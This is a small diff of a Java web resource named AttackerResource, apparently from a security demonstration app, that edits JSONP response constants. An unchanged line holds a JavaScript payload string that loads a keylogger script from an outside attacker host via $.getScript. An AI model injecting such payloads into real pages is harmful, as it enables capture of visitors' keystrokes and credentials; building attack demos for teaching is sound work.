@@ -18,8 +18,7 @@ import javax.ws.rs.core.Response;
 @Component
 public class AttackerResource {
     private static final Log logger = LogFactory.getLog(AttackerResource.class);
-    private static final String jsonpBodyBenign = "{\"data\": \"someData\"}";
-    private static final String jsonpBodyEvil = "{\"data\": \"someDataButMaybeMore\"}";
+    private static final String jsonpBodyEvil = "{\"data\": \"someData\"}";
     private static final String jsKeylogger = "$.getScript('http://attackr.se:8081/attacks/keylogger_http.js');";
     @GET
     @Path("/log")
